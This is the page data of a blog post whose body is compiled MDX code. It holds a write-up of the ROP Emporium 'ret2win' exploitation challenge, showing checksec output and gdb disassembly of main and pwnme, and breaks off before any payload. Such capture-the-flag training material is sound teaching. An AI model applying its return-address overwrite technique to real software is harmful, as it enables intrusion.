{"pageProps":{"post":{"mdxSource":"var Component=(()=>{var p=Object.create;var l=Object.defineProperty;var d=Object.getOwnPropertyDescriptor;var m=Object.getOwnPropertyNames;var h=Object.getPrototypeOf,N=Object.prototype.hasOwnProperty;var o=a=>l(a,\"__esModule\",{value:!0});var k=(a,s)=>()=>(s||a((s={exports:{}}).exports,s),s.exports),u=(a,s)=>{o(a);for(var r in s)l(a,r,{get:s[r],enumerable:!0})},b=(a,s,r)=>{if(s&&typeof s==\"object\"||typeof s==\"function\")for(let n of m(s))!N.call(a,n)&&n!==\"default\"&&l(a,n,{get:()=>s[n],enumerable:!(r=d(s,n))||r.enumerable});return a},g=a=>b(o(l(a!=null?p(h(a)):{},\"default\",a&&a.__esModule&&\"default\"in a?{get:()=>a.default,enumerable:!0}:{value:a,enumerable:!0})),a);var i=k((j,t)=>{t.exports=_jsx_runtime});var y={};u(y,{default:()=>v,frontmatter:()=>x});var e=g(i()),x={title:\"Return-Oriented Programming - ret2win\",date:\"2021-12-20\",tags:[\"ropemporium\",\"rop\",\"pwn\"],draft:!1,summary:\"ret2win means return here to win and it's recommended you start with this challenge. Visit the challenge page by clicking this card to learn more.\",images:\"/static/images/ropemporium/ret2win.jpg\",layout:\"PostLayout\"};function f(a={}){let{wrapper:s}=a.components||{};return s?(0,e.jsx)(s,Object.assign({},a,{children:(0,e.jsx)(r,{})})):r();function r(){let n=Object.assign({h1:\"h1\",a:\"a\",span:\"span\",p:\"p\",blockquote:\"blockquote\",strong:\"strong\",code:\"code\",pre:\"pre\",div:\"div\",h2:\"h2\"},a.components),{Image:c}=n;return c||w(\"Image\",!0),(0,e.jsxs)(e.Fragment,{children:[(0,e.jsxs)(n.h1,{id:\"introduction\",children:[(0,e.jsx)(n.a,{href:\"#introduction\",\"aria-hidden\":\"true\",tabIndex:\"-1\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Introduction\"]}),(0,e.jsx)(n.p,{children:\"Challenge description\"}),(0,e.jsx)(n.blockquote,{children:(0,e.jsx)(n.p,{children:\"Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack.\"})}),(0,e.jsx)(n.p,{children:\"This challenge is classical pwn challenge of overwriting the return address with desired address you want to return to.\"}),(0,e.jsxs)(n.p,{children:[\"The binaries for the challenges can be downloaded from the author`s website \",(0,e.jsx)(n.a,{href:\"https://ropemporium.com\",children:\"ropemporium\"}),\".The goal of first challenge is to call the \",(0,e.jsx)(n.strong,{children:\"ret2win\"}),\" function.\"]}),(0,e.jsxs)(n.p,{children:[\"After downloading the binary, the first thing is to check the binary protection enabled on the binary using \",(0,e.jsx)(n.code,{children:\"checksec\"}),\" utility.\"]}),(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-bash\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`vx@archie:ret2win$ checksec --file ret2win\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    Arch:     amd64-64-little\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    RELRO:    Partial RELRO\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    Stack:    No canary found\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    NX:       NX enabled\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    PIE:      No PIE \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"0x400000\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),(0,e.jsxs)(n.p,{children:[\"Only \",(0,e.jsx)(n.strong,{children:\"NX\"}),\" (Not executable) is enabled on the binary meaning we cannot execute code stored on the stack like shellcode.and the behavior of this program we will use gdb. gdb is a tools that enables to inspect the behavior of binaries at runtime.\"]}),(0,e.jsx)(n.pre,{className:\"language-nasm\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-nasm\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`(gdb) info functions\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`All defined functions:\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Non\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),`debugging symbols:\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400528\"}),`  _init\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400550\"}),`  puts@plt\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400560\"}),`  system@plt\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400570\"}),`  printf@plt\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400580\"}),`  memset@plt\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400590\"}),`  read@plt\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004005a0\"}),`  setvbuf@plt\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004005b0\"}),`  _start\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004005e0\"}),`  _dl_relocate_static_pie\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004005f0\"}),`  deregister_tm_clones\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400620\"}),`  register_tm_clones\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400660\"}),\"  __do_\",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"global_dtors_aux\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400690\"}),`  frame_dummy\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400697\"}),`  main\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006e8\"}),`  pwnme\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400756\"}),`  ret2win\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400780\"}),`  __libc_csu_init\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004007f0\"}),`  __libc_csu_fini\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004007f4\"}),`  _fini\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`(gdb)\n`})]})}),(0,e.jsx)(n.p,{children:\"The binary has various functions has as shown in the output above.For initial analysis we start at the main function which is the entrypoint of our program.\"}),(0,e.jsx)(n.pre,{className:\"language-nasm\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-nasm\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`(No debugging symbols found in ret2win)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`(gdb) disas main\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Dump of assembler code for function main:\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400697\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tpush   \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400698\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),\",\",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rsp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000040069b\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"4\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rax\"}),\",QWORD PTR \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"[\"}),\"rip\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x2009b6\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"]\"}),\"        # \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x601058\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),\"stdout@@GLIBC_2\",(0,e.jsx)(n.span,{className:\"token number\",children:\".2\"}),\".\",(0,e.jsx)(n.span,{className:\"token number\",children:\"5\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006a2\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"11\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"ecx\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006a7\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"16\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edx\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x2\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006ac\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"21\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"esi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006b1\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"26\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rdi\"}),\",\",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rax\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006b4\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"29\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x4005a0\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),\"setvbuf@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006b9\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"34\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400808\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006be\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"39\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400550\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),\"puts@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006c3\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"44\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400820\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006c8\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"49\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400550\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),\"puts@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006cd\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"54\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"eax\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006d2\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"59\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x4006e8\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),\"pwnme\",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006d7\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"64\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400828\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006dc\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"69\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400550\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),\"puts@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006e1\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"74\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"eax\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006e6\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"79\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tpop    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006e7\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"80\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`:\tret\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`End of assembler dump.\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`(gdb)\n`})]})}),(0,e.jsxs)(n.p,{children:[\"From the initial analysis of the main function, we are calling an interesting function called \",(0,e.jsx)(n.strong,{children:\"pwnme\"}),\". Next disassemble \",(0,e.jsx)(n.strong,{children:\"pwnme\"}),\" function to understand the behavior.\"]}),(0,e.jsx)(n.pre,{className:\"language-nasm\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-nasm\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`(gdb) disas pwnme\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Dump of assembler code for function pwnme:\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006e8\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tpush   \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006e9\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),\",\",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rsp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006ec\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"4\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tsub    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rsp\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x20\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006f0\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tlea    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rax\"}),\",\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x20\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006f4\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"12\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edx\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x20\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006f9\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"17\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"esi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000004006fe\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"22\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rdi\"}),\",\",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rax\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400701\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"25\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400580\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),\"memset@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400706\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"30\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400838\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000040070b\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"35\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400550\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),\"puts@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400710\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"40\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400898\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400715\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"45\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400550\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),\"puts@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000040071a\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"50\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x4008b8\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000040071f\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"55\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400550\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),\"puts@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400724\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"60\"}),(0,e.jsx)(n.span,{className:\"token 